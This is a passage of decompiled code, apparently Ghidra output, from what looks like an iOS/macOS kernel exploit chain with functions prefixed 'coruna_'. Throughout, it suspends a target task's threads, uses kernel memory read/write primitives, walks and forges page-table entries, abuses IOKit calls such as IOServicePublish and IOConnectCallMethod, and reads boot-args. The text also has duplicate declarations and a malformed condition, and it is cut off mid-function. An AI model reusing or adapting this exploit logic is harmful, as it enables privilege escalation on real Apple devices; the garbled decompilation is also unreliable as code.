      err = coruna_fn_ptr_cast_10(base,4);
      if (err != 0) goto fail;
      handle = *(long *)(base + 0x3a8);
    }
    if (1 < (int)u + 1U) {
      if (handle == 0) {
        err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&serial_buf);
joined_r0x00016b38:
        version = 0;
        if (err == 0) {
          scratch = scratch & 0xffffffff00000000;
          handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(base,serial_buf);
          if ((handle == 0) ||
             (err = _IORegistryEntryGetChildIterator(u,"IOService",&scratch), err != 0))
          goto done;
          while( true ) {
            size = _IOIteratorNext(scratch & 0xffffffff);
            err = (int)size;
            if (err == 0) break;
            addr = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(base,size);
            if (handle == addr) goto cleanup;
            _IOObjectRelease(size);
          }
          handle = 0;
cleanup:
          _IOObjectRelease(scratch & 0xffffffff);
          version = 0;
          if ((err != 0) && (handle != 0)) {
            handle = handle + 0x20;
            status = coruna_kernel509_residual_307(base,handle,&host_info);
            if ((status != 0) &&
               (((addr = *(long *)(base + 0x390), *(unsigned long *)(base + 0x158) < 0x1f530000000000 ||
                 ((status = coruna_kernel509_residual_307(base,*(long *)(base + 0x390) + 0x88,&thread_attr), status != 0
                  && (off = coruna_fn_ptr_cast_2(base,thread_attr), addr = thread_attr, off != 0)))) &&
                (thread_attr = addr, status = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(base,handle,thread_attr), status != 0)))) {
              status = _IORegistryEntryCreateCFProperties
                                (size,&bootargs,*(uint64_t *)k_kernel_kcfallocatordefault_slot,0)
              ;
              flags = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(base,handle,host_info);
              if ((flags == 0) || (status != 0)) {
                if (bootargs != 0) {
                  _CFRelease();
                }
              }
              else if (bootargs != 0) {
                *ptr = bootargs;
                version = 1;
                goto check_ok;
              }
            }
            version = 0;
          }
check_ok:
          if (1 < err + 1U) {
            _IOObjectRelease(size);
          }
        }
      }
      else {
        err = coruna_pthread_attr_setdetachstate(base,*(uint32_t *)(base + 0x37c),0);
        if (err == 0) {
done:
          version = 0;
        }
        else {
          err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&serial_buf);
          status = coruna_pthread_attr_setdetachstate(base,*(uint32_t *)(base + 0x37c),handle);
          version = 0;
          if (status != 0) goto joined_r0x00016b38;
        }
      }
      if (1 < serial_buf + 1U) {
        scratch = 1;
        _IOServiceClose();
        _IOServiceWaitQuiet(u,&scratch);
      }
      _IOObjectRelease(u);
      *(uint32_t *)(handle + 3) = version;
      return;
    }
  }
  version = 0;
skip:
  *(uint32_t *)(handle + 3) = version;
  return;
}
void coruna_ioservice_publish(long *handle)
{
  task_t target_task;
  uint8_t *ptr;
  mach_port_t lm2;
  uint u;
  uint size;
  int err;
  uint version;
  long handle;
  uint64_t port;
  long addr;
  long *ptr;
  long off;
  unsigned long tag;
  long base;
  mach_port_name_t name;
  long scratch;
  uint64_t bootargs;
  thread_act_array_t thread_attr;
  uint64_t host_info;
  
  ptr = (long *)*handle;
  base = *ptr;
  target_task = *(task_t *)(ptr + 1);
  off = ptr[2];
  thread_attr = (thread_act_array_t)0x0;
  host_info = 0;
  bootargs = 0;
  lm2 = _mach_host_self();
  u = _host_get_io_master(lm2,(io_master_t *)((long)&host_info + 4));
  ptr = k_kernel_mach_task_self_slot;
  if ((u == 0) &&
     (u = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,
                                  (mach_port_name_t *)&host_info), u == 0)) {
    u = 0xad009;
    off = _IOCFSerialize(off,1);
    if (off != 0) {
      handle = _CFDataGetBytePtr();
      port = _CFDataGetLength(off);
      version = 0xad009;
      if (handle == 0 || (int)port == 0) {
fail:
        u = version;
        name = 0;
      }
      else {
        if (*(long *)(&k_kernel_slot_19a8 + base) == 0) {
          addr = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_3(base,"iokit.OSDictionary");
          if (addr == 0) {
            version = 0xad011;
            goto fail;
          }
          *(long *)(&k_kernel_slot_19a8 + base) = addr;
        }
        u = 0x2800f;
        err = *(int *)(base + 0x140);
        if ((1 < err - 0x1f53U && err != 0x1c1b) && err != 0x1809) {
          version = 0x28011;
          goto fail;
        }
        lm2 = _mach_thread_self();
        err = coruna_call_mach_timebase_info(lm2);
        if (err == 0) {
          version = 0x28038;
          goto fail;
        }
        lm2 = _mach_thread_self();
        version = coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_4(base,lm2,1,1,0x60);
        if (version != 0) goto fail;
        _thread_switch(0,2,10);
        if (*(task_t *)ptr == target_task) {
          version = _task_threads(target_task,&thread_attr,
                                (mach_msg_type_number_t *)((long)&bootargs + 4));
          if (version != 0) {
            version = version | 0x80000000;
            goto fail;
          }
          if (bootargs != 0) {
            tag = 0;
            do {
              if (1 < thread_attr[tag] + 1) {
                lm2 = _mach_thread_self();
                if (lm2 != thread_attr[tag]) {
                  _thread_suspend(thread_attr[tag]);
                }
              }
              tag = tag + 1;
            } while (tag < bootargs >> 0x20);
          }
        }
        else {
          version = _task_suspend2(target_task,(task_suspension_token_t *)&bootargs);
          if (version != 0) {
            version = version | 0x80000000;
            goto fail;
          }
        }
        err = coruna_pthread_attr_setdetachstate(base,*(uint32_t *)(base + 0x378),0);
        if (err == 0) {
          port = 0;
cleanup:
          u = 0x1001;
        }
        else {
          version = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b9a4(base,*(uint64_t *)(&k_kernel_slot_19a8 + base),0x28,
                               *(uint64_t *)(base + 0x390),coruna_call_ioservicegetmatchingservice_1a3ec,0);
          if (version == 0) {
            port = coruna_mig_dealloc_reply_port(host_info,"IOServicePublish",handle,port,host_info & 0xffffffff
                                 ,0,0);
            if ((int)port == 0) goto cleanup;
            scratch = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(base,port);
            if (scratch == 0) {
              u = 0x2800e;
            }
            else {
              err = coruna_kernel509_residual_307(base,scratch + 0x10,&scratch);
              if ((err != 0) &&
                 (err = coruna_kernel509_residual_307(base,scratch + 0x18,&scratch), err != 0)) {
                if (*(long *)(base + 0x390) == scratch) {
                  err = coruna_mach_vm_machine_attribute(base,*(long *)(base + 0x390) +
                                              (long)*(int *)(base + 0x168),0xff);
                  if (err == 0) {
                    u = 0x28010;
                  }
                  else {
                    err = coruna_pthread_attr_setdetachstate(base,*(uint32_t *)(base + 0x378),
                                         *(uint64_t *)(base + 0x3a0));
                    u = 0;
                    if (err == 0) {
                      u = 0x28010;
                    }
                  }
                }
                else {
                  u = 0x2803c;
                }
              }
            }
          }
          else {
            port = 0;
            u = version;
          }
        }
        name = (mach_port_name_t)port;
      }
      _CFRelease(off);
      if ((bootargs != 0) && (thread_attr != (thread_act_array_t)0x0)) {
      tag = 0;
      do {
      if (1 < thread_attr[tag] + 1) {
      lm2 = _mach_thread_self();
      if (lm2 != thread_attr[tag]) {
      _thread_resume(thread_attr[tag]);
      }
      }
      tag = tag + 1;
      } while (tag < bootargs >> 0x20);
      _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t)thread_attr,
      (bootargs >> 0x20) << 2);
      }
      if (1 < (task_suspension_token_t)bootargs + 1) {
      size = _task_resume2((task_suspension_token_t)bootargs);
      version = size | 0x80000000;
      if (u != 0) {
      version = u;
      }
      if (size != 0) {
      u = version;
      }
      }
      if (1 < host_info + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,host_info);
      }
      if (1 < name + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,name);
      }
      if (1 < (mach_port_name_t)host_info + 1) {
      _mach_port_mod_refs(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)host_info,1,
      -1);
      }
      *(uint *)(handle + 1) = u;
      return;
    }
  }
  else {
    u = u | 0x80000000;
  }
  name = 0;
check_ok:
  if ((bootargs != 0) && (thread_attr != (thread_act_array_t)0x0)) {
    tag = 0;
    do {
      if (1 < thread_attr[tag] + 1) {
        lm2 = _mach_thread_self();
        if (lm2 != thread_attr[tag]) {
          _thread_resume(thread_attr[tag]);
        }
      }
      tag = tag + 1;
    } while (tag < bootargs >> 0x20);
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t)thread_attr,
                   (bootargs >> 0x20) << 2);
  }
  if (1 < (task_suspension_token_t)bootargs + 1) {
    size = _task_resume2((task_suspension_token_t)bootargs);
    version = size | 0x80000000;
    if (u != 0) {
      version = u;
    }
    if (size != 0) {
      u = version;
    }
  }
  if (1 < host_info + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,host_info);
  }
  if (1 < name + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,name);
  }
  if (1 < (mach_port_name_t)host_info + 1) {
    _mach_port_mod_refs(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)host_info,1,
                        -1);
  }
  *(uint *)(handle + 1) = u;
  return;
}
void coruna_call_ioservicegetmatchingservice_1a3ec(void)
{
  coruna_ioservicegetmatchingservice_1a3ec("xyz");
  return;
}
void coruna_bzero_22b70(long handle)
{
  void *ptr;
  
  ptr = *(void **)(&k_kernel_slot_1d58 + handle);
  if (ptr != (void *)0x0) {
    *(uint64_t *)(&k_kernel_slot_1d58 + handle) = 0;
    _bzero(ptr,0x520);
    _free(ptr);
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c(long handle,unsigned long arg,int flags)
{
  bool err;
  int err;
  int status;
  long handle;
  unsigned long u;
  uint64_t size;
  long addr;
  int scratch;
  uint8_t bootargs[4];
  int thread_attr;
  unsigned long host_info [4];
  unsigned long serial_buf;
  
  addr = *(long *)(&k_kernel_slot_1d58 + handle);
  u = *(unsigned long *)(handle + 0x188);
  thread_attr = flags;
  err = coruna_mach_absolute_time_1a9c0(handle,8,&k_kernel_slot_3a98);
  if (err != 0) {
    return;
  }
  if (addr == 0) {
    err = coruna_ioconnectcallscalarmethod(handle);
    coruna_kernel5_residual_251(handle,8);
    return;
  }
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,arg,4,bootargs);
  if (((err != 0) &&
      (err = coruna_call_mach_vm_machine_attribute_1d4f8_22818(handle,arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
                            host_info), err != 0)) && ((serial_buf & 0xffffffffc000) != 0)) {
    handle = *(long *)(addr + 0x518);
    size = *(uint64_t *)(addr + 0x510);
    err = 99;
    while (status = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,size,8,host_info), status != 0) {
      host_info[0] = host_info[0] & 0xffff000000003fff | serial_buf & 0xffffffffc000;
      status = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,size,host_info,8);
      if (status == 0) break;
      coruna_semaphore_timedwait(handle,&k_kernel_slot_2710);
      status = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + (u & arg),&thread_attr,4);
      if (((status == 0) || (status = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,arg,4,&scratch), status == 0)) ||
         ((scratch == thread_attr || (err = err == 0, err = err + -1, err)))) break;
    }
  }
fail:
  coruna_kernel5_residual_251(handle,8);
  return;
}
void coruna_ioconnectcallscalarmethod(long handle)
{
  uint64_t *ptr;
  long *ptr;
  uint u;
  uint32_t size;
  uint32_t version;
  uint8_t size[16];
  unsigned long port;
  unsigned long *buf;
  bool err;
  int err;
  kern_return_t lk11;
  int status;
  void *buf;
  void *str;
  void *copy;
  uint *str;
  unsigned long tag;
  unsigned long kind;
  long handle;
  uint64_t *copy;
  long addr;
  unsigned long type_id;
  uint64_t type_id_8;
  unsigned long *data;
  unsigned long type_id_9;
  unsigned long type_id_10;
  unsigned long type_id_11;
  unsigned long type_id_12;
  byte *data;
  int *err;
  byte *obj;
  long off;
  long base;
  long *block;
  unsigned long type_id_13;
  int *status;
  char *ptr;
  uint8_t *obj;
  unsigned long type_id_14;
  unsigned long type_id_15;
  long ctx_val;
  long serial;
  uint64_t *block;
  uint type_id_16;
  uint64_t type_id_17;
  uint64_t type_id_18;
  uint64_t type_id_19;
  uint64_t type_id_20;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  long block_ctx;
  long stack_guard [3];
  vm_address_t sa_saved;
  uint64_t scratch;
  uint64_t sa_new;
  unsigned long path_buf;
  uint64_t bootargs;
  uint64_t tmp_buf;
  uint64_t region;
  uint8_t plist[12];
  uint32_t url_buf;
  unsigned long json_buf [2];
  unsigned long frame;
  unsigned long thread_attr;
  vm_prot_t work;
  uint32_t host_info;
  uint cache;
  unsigned long cache_20 [2];
  unsigned long *cache_21;
  uint64_t serial_buf;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t action;
  uint64_t cache_24;
  uint64_t block_ctx;
  uint64_t cache_25;
  uint64_t stack_guard;
  uint64_t cache_26;
  uint64_t sa_saved;
  uint64_t cache_27;
  uint64_t sa_new;
  uint64_t cache_28;
  uint64_t path_buf;
  uint64_t cache_29;
  uint64_t tmp_buf;
  uint64_t cache_30;
  uint64_t region;
  uint64_t cache_31;
  uint64_t plist;
  uint64_t cache_32;
  uint64_t url_buf;
  uint64_t cache_33;
  uint64_t json_buf;
  uint64_t cache_34;
  uint64_t frame;
  uint64_t cache_35;
  uint64_t work;
  uint64_t cache_36;
  uint64_t cache;
  uint64_t cache_37;
  uint64_t cache_20;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  unsigned long cache_24;
  uint64_t cache_25;
  uint64_t cache_41;
  uint64_t cache_26;
  uint64_t cache_42;
  uint64_t cache_27;
  uint64_t cache_43;
  uint64_t cache_28;
  uint64_t cache_44;
  uint64_t cache_29;
  uint64_t cache_45;
  uint64_t cache_30;
  uint64_t cache_46;
  uint64_t cache_31;
  uint64_t cache_47;
  uint64_t cache_32;
  uint64_t cache_48;
  uint64_t cache_33;
  uint64_t cache_49;
  uint64_t cache_34;
  uint64_t cache_50;
  long cache_51;
  uint64_t cache_52;
  uint64_t cache_35;
  uint64_t cache_53;
  uint64_t cache_36;
  uint64_t cache_54;
  uint64_t cache_37;
  uint64_t cache_55;
  uint64_t cache_38;
  uint64_t cache_56;
  uint64_t cache_57;
  uint64_t cache_39;
  uint32_t cache_58;
  uint32_t cache_40;
  uint32_t cache_41;
  unsigned long cache_59;
  long cache_60;
  int *flags;
  
  cache_60 = *(long *)k_kernel_stack_chk_guard_slot;
  if ((((*(unsigned long *)(handle + 0x158) < 0x225c23801af00d) ||
       (err = coruna_fn_ptr_cast_10(handle,0x5184000), err == 0)) ||
      (*(long *)(&k_kernel_slot_1d58 + handle) != 0)) ||
     if (*(long *)k_kernel_stack_chk_guard_slot == cache_60) {
     return;
     }
     ___stack_chk_fail();
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_2(long handle,unsigned long arg)
{
  unsigned long u;
  int err;
  int status;
  long handle;
  long addr;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  long off;
  long base;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  unsigned long host_info [2048];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  version = *(unsigned long *)(&k_kernel_slot_19e8 + handle);
  port = *(unsigned long *)(&k_kernel_slot_19f0 + handle);
  err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
  status = coruna_fn_ptr_cast_10(handle,0x5000008);
  if (status == 0) {
    status = coruna_fn_ptr_cast_10(handle,0x180000);
    tag = 0x7ff;
    if (err < 8 || status == 0) {
      tag = 7;
    }
  }
  else {
    tag = 0x7ff;
  }
  handle = coruna_kernel509_residual_302(handle);
  if (((handle != 0) && (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle,8,&thread_attr), err != 0)) &&
     (version < port)) {
    base = 0;
    handle = 0;
    off = 0;
    do {
      addr = thread_attr + (tag & version >> 0x24) * 8;
      if ((addr != handle) &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,addr,8,&bootargs), handle = addr, err == 0)) break;
      if (((bootargs & 1) == 0) ||
         (addr = coruna_helper_2abf4_39b14(handle,bootargs & 0xffffffffc000), addr == 0)) {
        version = version + 0x1000000000;
        size = version & 0xfffffff000000000;
        u = version & 0xfffffff000000000;
fail:
        if (u != 0) {
          version = size;
        }
      }
      else {
        addr = addr + (version >> 0x16 & 0x3ff8);
        if ((base != addr) &&
           (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,addr,8,&scratch), base = addr, err == 0)) break;
        if ((scratch & 1) == 0) {
done:
          version = version + 0x2000000;
          size = version & 0xfffffffffe000000;
          u = version & 0xfffffffffe000000;
          if (u != 0) {
          version = size;
          }
          }
          else {
          addr = addr + (version >> 0x16 & 0x3ff8);
          if ((base != addr) &&
          (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,addr,8,&scratch), base = addr, err == 0)) break;
        }
        if ((((uint)scratch >> 1 & 1) == 0) && ((scratch & 0xfffffe000000) == arg)) break;
        addr = coruna_helper_2abf4_39b14(handle,scratch & 0xffffffffc000);
        version = version + 0x2000000;
        size = version & 0xfffffffffe000000;
        u = version & 0xfffffffffe000000;
        if (u != 0) {
        version = size;
        }
        }
        else {
        addr = addr + (version >> 0x16 & 0x3ff8);
        if ((base != addr) &&
        (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,addr,8,&scratch), base = addr, err == 0)) break;
        if (((off != addr) &&
            (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,addr,0x4000,host_info), off = addr, err == 0))
           || ((host_info[version >> 0xe & 0x7ff] & 0xffffffffc000) == arg)) break;
        version = version + *(uint *)(handle + 0x180);
      }
    } while (version < port);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_kernel509_residual_298(long handle,uint *size,uint *flags_2,unsigned long arg)
{
  uint *ptr;
  uint *buf;
  unsigned long u;
  
  buf = *(uint **)(*(long *)(&k_kernel_slot_1d58 + handle) + 0x148);
  ptr = (uint *)(*(long *)(*(long *)(&k_kernel_slot_1d58 + handle) + 0x150) + (long)buf);
  if (buf < ptr) {
    do {
      if ((*flags_2 & *buf) == *size) {
        if (ptr <= buf + arg || arg < 2) {
          return;
        }
        u = 1;
        while ((flags_2[u] & buf[u]) == size[u]) {
          u = u + 1;
          if (arg == u) {
            return;
          }
        }
      }
      buf = buf + 1;
    } while (buf < ptr);
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_3(long handle,unsigned long arg,uint64_t *val)
{
  int err;
  unsigned long u;
  long handle;
  long addr;
  uint64_t scratch;
  
  addr = *(long *)(&k_kernel_slot_1d58 + handle);
  u = *(unsigned long *)(addr + 0x128);
  if ((arg < u) || (*(long *)(addr + 0x138) + u <= arg)) {
    handle = 0;
  }
  else {
    handle = (arg - u) + *(long *)(addr + 0xf8);
  }
  u = *(unsigned long *)(addr + 0x130);
  if ((u <= arg) && (arg < *(long *)(addr + 0x140) + u)) {
    handle = (arg - u) + *(long *)(addr + 0x100);
  }
  if ((handle != 0) && (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle,8,&scratch), err != 0)) {
    *val = scratch;
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_4(long handle,unsigned long arg,long *addr_2,unsigned long arg)
{
  int err;
  long handle;
  unsigned long scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(*(long *)(&k_kernel_slot_1d58 + handle) + 0x250) +
                               (arg >> 0x21 & 0x38),8,&thread_attr);
  if ((err != 0) && ((thread_attr & 1) != 0)) {
    if ((arg & 1) == 0) {
      handle = coruna_helper_2abf4_39b14(handle,thread_attr & 0xffffffffc000);
    }
    else {
      handle = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_2();
    }
    if (handle != 0) {
      handle = handle + (arg >> 0x16 & 0x3ff8);
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle,8,&bootargs);
      if ((err != 0) && ((bootargs & 1) != 0)) {
        if (((uint)bootargs >> 1 & 1) != 0) {
          if ((arg & 1) == 0) {
            handle = coruna_helper_2abf4_39b14(handle,bootargs & 0xffffffffc000);
          }
          else {
            handle = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_2();
          }
          if (handle == 0) {
            return;
          }
          handle = handle + (arg >> 0xb & 0x3ff8);
          err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle,8,&scratch);
          if (err == 0) {
            return;
          }
          if ((scratch & 1) == 0) {
            return;
          }
        }
        if (addr_2 != (long *)0x0) {
          *addr_2 = handle;
        }
      }
    }
  }
  return;
}
void coruna_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_4(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  long handle;
  
  handle = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_4(handle,val,0,0);
  if ((handle != 0) && (err = coruna_mach_make_memory_entry_2aed0(handle,handle,id_2 + 3), err == 0)) {
    *id_2 = id_2[3];
    id_2[1] = val;
    id_2[2] = (unsigned long)*(uint *)(handle + 0x180);
  }
  return;
}
void coruna_kernel509_via_mach_port_allocate(long handle,uint64_t val,uint64_t id_2)
{
  int err;
  unsigned long u;
  uint32_t scratch;
  uint8_t bootargs[32];
  unsigned long thread_attr;
  
  scratch = 0x4000;
  u = coruna_mach_port_request_notification_29a50(handle,&scratch);
  if (u != 0) {
    err = coruna_call_mach_vm_machine_attribute_1d4f8_22818(handle,u & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
                         bootargs);
    thread_attr = thread_attr & 0xffffffffc000;
    if (((err == 0 || thread_attr == 0) ||
        (err = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_3(handle,val,thread_attr), err != 0)) ||
       (err = coruna_mach_make_memory_entry_2aed0(handle,thread_attr,id_2), err != 0)) {
      coruna_mach_port_allocate(handle,u,scratch);
    }
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_3(long handle,unsigned long arg,unsigned long arg)
{
  bool err;
  bool status;
  int err;
  long handle;
  unsigned long u;
  unsigned long size;
  long addr;
  uint32_t scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  unsigned long host_info [4];
  unsigned long serial_buf;
  
  addr = *(long *)(&k_kernel_slot_1d58 + handle);
  scratch = 0x4000;
  u = arg + 0x8000000000;
  err = u < 0x1ffc001;
  status = 0x1ffc000 < arg + 0xffe000000;
  size = *(unsigned long *)(addr + 0x310);
  if ((arg >= size && arg <= size + 0x2000000) &&
      (arg < size || size + 0x2000000 != arg)) {
    return;
  }
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(addr + 0x300) + (arg >> 0x21 & 0x38),8,&thread_attr);
  if (err == 0) {
    return;
  }
  if (u < 0x1ffc001) {
    handle = *(long *)(addr + 0x4f8);
  }
  else if (err || status) {
    handle = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_2(handle,thread_attr & 0xffffffffc000);
  }
  else {
    handle = *(long *)(addr + 0x308);
  }
  if (handle == 0) {
    return;
  }
  handle = handle + (arg >> 0x16 & 0x3ff8);
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle,8,&bootargs);
  if (err == 0) {
    return;
  }
  if ((bootargs & 1) == 0) {
    u = coruna_vm_deallocate_2a1cc(handle,&scratch);
    if (u == 0) {
      return;
    }
    err = coruna_call_mach_vm_machine_attribute_1d4f8_22818(handle,u & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),host_info
                        );
    if ((err != 0) && ((serial_buf & 0xffffffffc000) != 0)) {
      bootargs = serial_buf & 0xffffffffc000 | 0x460000000000603;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle,&bootargs,8);
      if (err != 0) {
        if (!err && !status) {
          *(unsigned long *)(addr + 0x508) = u;
        }
        goto fail;
      }
    }
    coruna_mach_port_allocate(handle,u,scratch);
  }
  else {
    if (u < 0x1ffc001) {
      u = *(unsigned long *)(addr + 0x500);
    }
    else if (err || status) {
      u = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_2(handle,bootargs & 0xffffffffc000);
      if (u == 0) {
        return;
      }
    }
    else {
      u = *(unsigned long *)(addr + 0x508);
    }
fail:
    host_info[0] = arg | 0x60000000000443;
    coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,u + (arg >> 0xb & 0x3ff8),host_info,8);
  }
  return;
}
void coruna_kernel09_residual_261(long handle,long addr_2,uint32_t size)
{
  long handle;
  long *ptr;
  long addr;
  long *buf;
  
  handle = *(long *)(&k_kernel_slot_1d58 + handle);
  buf = *(long **)(handle + 600);
  addr = *(long *)(handle + 0x260);
  ptr = *(long **)(handle + 0x2a8);
  *buf = addr + 0x200;
  *(uint32_t *)(buf + 0x40) = 9;
  *(uint32_t *)((long)buf + 0xc) = 10;
  *(uint32_t *)(buf + 4) = 1;
  *(uint32_t *)(buf + 5) = 1;
  *(long *)((long)buf + 0x2c) = addr + 0x300;
  *(uint32_t *)((long)buf + 0x4c) = 0;
  *(uint32_t *)(buf + 0xe) = 0;
  buf[0x60] = addr_2;
  *(uint32_t *)(buf + 0x62) = size;
  buf[0x80] = addr;
  buf[0x93] = addr;
  buf[0x94] = addr;
  do {
  } while (*ptr != 0);
  *ptr = addr + 0x400;
  return;
}
void coruna_ioconnectcallmethod(long handle,long addr_2,int flags)
{
  uint32_t u;
  uint64_t size;
  int err;
  long handle;
  long addr;
  uint32_t *ptr;
  long off;
  uint8_t scratch[8];
  long bootargs;
  uint thread_attr;
  uint32_t host_info;
  uint32_t serial_buf;
  uint16_t action[2];
  uint32_t block_ctx;
  uint64_t stack_guard;
  long sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t scratch;
  uint64_t tmp_buf;
  uint64_t bootargs;
  uint64_t region;
  uint64_t thread_attr;
  unsigned long plist;
  uint64_t url_buf;
  uint64_t host_info;
  uint64_t json_buf;
  long frame;
  
  frame = *(long *)k_kernel_stack_chk_guard_slot;
  off = *(long *)(&k_kernel_slot_1d58 + handle);
  block_ctx = 0x4000;
  sa_saved = addr_2;
  handle = coruna_mach_port_request_notification_29a50(handle,&block_ctx);
  if (handle != 0) {
    action[0] = 0x100;
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle,action,2);
    if (((((err != 0) &&
          (err = coruna_kernel509_residual_307(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),
                                &stack_guard), err != 0)) &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),4,
                               &serial_buf), err != 0)) &&
        ((err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),4,
                               &host_info), err != 0 &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc0),4,
                               &thread_attr), err != 0)))) &&
       ((err = coruna_kernel509_residual_307(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xbc),
                              &bootargs), err != 0 &&
        ((bootargs != 0 &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),8,scratch),
         err != 0)))))) {
      u = 0x10002;
      if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
        u = 0x10003;
      }
      ptr = *(uint32_t **)(off + 0x98);
      *ptr = u;
      ptr[1] = 0x10;
      *(uint16_t *)(ptr + 2) = 0;
      size = k_kernel_rodata_word_43340;
      addr = *(long *)(off + 0xa0);
      *(uint64_t *)(addr + 0x10) = k_kernel_rodata_word_00043348;
      *(uint64_t *)(addr + 8) = size;
      plist = (unsigned long)*(uint *)(off + 0xc);
      host_info = k_kernel_rodata_word_00043808;
      url_buf = k_kernel_rodata_word_43800;
      json_buf = 0x38;
      bootargs = 0;
      tmp_buf = 0;
      thread_attr = 0;
      region = 0;
      scratch = 0;
      path_buf = 0;
      sa_new = *(uint64_t *)(off + 0x1c);
      sa_saved = addr_2 - (unsigned long)thread_attr;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),handle);
      if (err != 0) {
        err = coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),1);
        if (err != 0) {
          err = coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),
                               flags + -0x100);
          if (err != 0) {
            err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),&sa_saved,8);
            if (err != 0) {
              _IOConnectCallMethod
                        (*(uint32_t *)(off + 8),0x1a,&plist,4,&sa_new,0x38,0,0,0,0);
